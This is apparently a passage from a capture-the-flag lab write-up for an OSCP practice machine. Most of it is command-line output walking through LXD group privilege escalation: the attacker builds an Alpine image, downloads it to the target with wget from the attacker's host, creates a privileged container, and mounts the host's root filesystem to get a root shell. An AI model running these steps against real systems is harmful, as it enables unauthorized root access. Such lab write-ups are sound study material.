-bash-5.0$ id
uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

https://www.hackingarticles.in/lxd-privilege-escalation/

```console
root@kali:/OSCPv3/offsec_pg/InfosecPrep# git clone https://github.com/saghul/lxd-alpine-builder.git
Clonando en 'lxd-alpine-builder'...
remote: Enumerating objects: 35, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 35 (delta 2), reused 2 (delta 0), pack-reused 27
Desempaquetando objetos: 100% (35/35), listo.
root@kali:/OSCPv3/offsec_pg/InfosecPrep# cd lxd-alpine-builder/
root@kali:/OSCPv3/offsec_pg/InfosecPrep/lxd-alpine-builder# sudo ./build-alpine
Determining the latest release... v3.14
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.14/main/x86
Downloading apk-tools-static-2.12.7-r0.apk
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.4-r0.apk
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
.....
.....

(16/20) Installing scanelf (1.3.2-r0)
(17/20) Installing musl-utils (1.2.2-r3)
(18/20) Installing libc-utils (0.7.2-r3)
(19/20) Installing alpine-keys (2.4-r0)
(20/20) Installing alpine-base (3.14.2-r0)
Executing busybox-1.33.1-r3.trigger
OK: 9 MiB in 20 packages
root@kali:/OSCPv3/offsec_pg/InfosecPrep/lxd-alpine-builder# ls
alpine-v3.14-i686-20211105_0009.tar.gz  build-alpine  LICENSE  README.md
```

```console
-bash-5.0$ wget http://192.168.49.206:9090/alpine-v3.14-i686-20211105_0009.tar.gz
--2021-11-05 06:12:36--  http://192.168.49.206:9090/alpine-v3.14-i686-20211105_0009.tar.gz
Connecting to 192.168.49.206:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3283700 (3.1M) [application/gzip]
Saving to: 'alpine-v3.14-i686-20211105_0009.tar.gz'

alpine-v3.14-i686-20211105_0009.tar 100%[===================================================================>]   3.13M   520KB/s    in 8.0s    

2021-11-05 06:12:44 (399 KB/s) - 'alpine-v3.14-i686-20211105_0009.tar.gz' saved [3283700/3283700]
```

```console
-bash-5.0$ /snap/bin/lxc image import /tmp/alpine-v3.14-i686-20211105_0009.tar.gz --alias imagen
Image imported with fingerprint: 0a5e6de17100d7ab3c7a50ded08604aa36240a4d4c62f2badbf96c9279b97828

-bash-5.0$ /snap/bin/lxc image list
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
| imagen | 0a5e6de17100 | no     | alpine v3.14 (20211105_00:09) | i686         | CONTAINER | 3.13MB | Nov 5, 2021 at 6:19am (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
```

```console
-bash-5.0$ /snap/bin/lxc init imagen ignite -c security.privileged=true
Creating ignite
Error: No storage pool found. Please create a new storage pool
```

```console
-bash-5.0$ /snap/bin/lxc storage create pool dir
Storage pool pool created
-bash-5.0$ /snap/bin/lxc profile device add default root disk path=/ pool=pool
Device root added to default
```

```console
-bash-5.0$ /snap/bin/lxc init imagen ignite -c security.privileged=true
Creating ignite
                                           
The instance you are starting doesn't have any network attached to it.
  To create a new network, use: lxc network create
  To attach a network to an instance, use: lxc network attach
```

```console
-bash-5.0$ /snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
-bash-5.0$ /snap/bin/lxc start ignite
-bash-5.0$ /snap/bin/lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # ls
~ # ls -la
total 12
drwx------    2 root     root          4096 Nov  5 06:21 .
drwxr-xr-x   19 root     root          4096 Nov  5 06:21 ..
-rw-------    1 root     root            13 Nov  5 06:21 .ash_history
/mnt/root/root # ls
fix-wordpress  flag.txt       proof.txt      snap
```

References

https://github.com/Dionach/CMSmap
